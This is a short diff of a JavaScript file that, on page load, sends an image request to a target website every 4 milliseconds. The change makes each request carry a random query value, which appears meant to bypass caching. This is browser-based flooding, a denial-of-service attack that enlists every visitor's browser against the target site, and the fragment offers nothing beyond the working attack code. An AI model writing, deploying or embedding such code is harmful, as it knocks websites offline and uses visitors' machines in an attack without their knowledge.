@@ -4,7 +4,7 @@ window.onload = function () {
     const uri = '?';
     const pic = new Image();
     const rand = Math.floor(Math.random() * 1000);
-    pic.src = 'http://' + website + uri + rand + '=val';
+    pic.src = 'http://' + website + uri + rand + `=${rand}`;
   }
 
   setInterval(imgFlood, 4);
